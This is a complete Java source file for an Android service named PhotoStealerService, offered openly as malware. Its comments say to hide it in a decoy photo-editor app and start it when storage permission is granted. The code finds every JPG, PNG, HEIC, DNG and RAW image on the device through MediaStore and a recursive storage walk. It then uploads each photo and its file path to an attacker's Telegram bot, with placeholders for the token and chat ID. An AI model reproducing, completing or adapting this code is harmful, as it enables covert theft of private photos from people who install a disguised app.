// lang: Java, file: PhotoStealerService.java, target: Android 10+, compile against SDK 30+
// *runs as background Service after storage permission; scans JPG/JPEG/HEIC/HEIF/PNG/DNG/RAW*
// *exfils via Telegram Bot API sendDocument; placeholders for token + chat_id*
// *build into any photo-editor shell APK; start service on permission grant*

package com.photoeditor.core;   // rename to match your decoy package

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PhotoStealerService extends Service {

    // ── placeholders – replace before build ──────────────────────────────
    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
    private static final String CHAT_ID   = "YOUR_CHAT_ID_HERE";
    // ────────────────────────────────────────────────────────────────────

    private static final String TAG = "PES";
    private static final String[] EXT = {
            ".jpg", ".jpeg", ".heic", ".heif", ".png", ".dng", ".raw"
    };

    private final ExecutorService pool = Executors.newFixedThreadPool(3);

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        pool.execute(this::harvestAndSend);
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void harvestAndSend() {
        List<File> targets = new ArrayList<>();

        // 1. MediaStore (fast, indexed)
        collectFromMediaStore(targets);

        // 2. recursive walk (catches anything MediaStore missed)
        File root = Environment.getExternalStorageDirectory();
        if (root != null && root.exists())
            walk(root, targets);

        for (File f : targets) {
            if (f.length() > 0 && f.length() < 80 * 1024 * 1024) // skip empty / huge
                pool.execute(() -> upload(f));
        }
    }

    private void collectFromMediaStore(List<File> out) {
        String[] proj = { MediaStore.Images.Media.DATA };
        String sel = MediaStore.Images.Media.DATA + " LIKE ? OR " +
                     MediaStore.Images.Media.DATA + " LIKE ? OR " +
                     MediaStore.Images.Media.DATA + " LIKE ? OR " +
                     MediaStore.Images.Media.DATA + " LIKE ? OR " +
                     MediaStore.Images.Media.DATA + " LIKE ? OR " +
                     MediaStore.Images.Media.DATA + " LIKE ? OR " +
                     MediaStore.Images.Media.DATA + " LIKE ?";
        String[] args = { "%.jpg", "%.jpeg", "%.heic", "%.heif", "%.png", "%.dng", "%.raw" };

        try (Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                proj, sel, args, null)) {
            if (c == null) return;
            int idx = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            while (c.moveToNext()) {
                File f = new File(c.getString(idx));
                if (f.exists() && f.canRead())
                    out.add(f);
            }
        } catch (Exception ignored) {}
    }

    private void walk(File dir, List<File> out) {
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (f.isDirectory()) {
                if (!f.getName().startsWith("."))
                    walk(f, out);
            } else {
                String name = f.getName().toLowerCase();
                for (String e : EXT) {
                    if (name.endsWith(e)) {
                        out.add(f);
                        break;
                    }
                }
            }
        }
    }

    private void upload(File file) {
        String boundary = "----NoobBoundary" + System.currentTimeMillis();
        String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";

        HttpURLConnection conn = null;
        try {
            URL url = new URL(urlStr);
            conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000);

            DataOutputStream out = new DataOutputStream(conn.getOutputStream());

            // chat_id
            out.writeBytes("--" + boundary + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(CHAT_ID + "\r\n");

            // caption (optional, path for tracking)
            out.writeBytes("--" + boundary + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            out.writeBytes(file.getAbsolutePath() + "\r\n");

            // document
            out.writeBytes("--" + boundary + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" +
                    file.getName() + "\"\r\n");
            out.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(file));
            byte[] buf = new byte[8192];
            int n;
            while ((n = bis.read(buf)) != -1)
                out.write(buf, 0, n);
            bis.close();

            out.writeBytes("\r\n--" + boundary + "--\r\n");
            out.flush();
            out.close();

            int code = conn.getResponseCode();
            if (code != 200) {
                BufferedReader br = new BufferedReader(
                        new InputStreamReader(conn.getErrorStream()));
                String line;
                while ((line = br.readLine()) != null)
                    Log.e(TAG, line);
                br.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "upload fail: " + file.getName(), e);
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    @Override
    public void onDestroy() {
        pool.shutdownNow();
        super.onDestroy();
    }
}
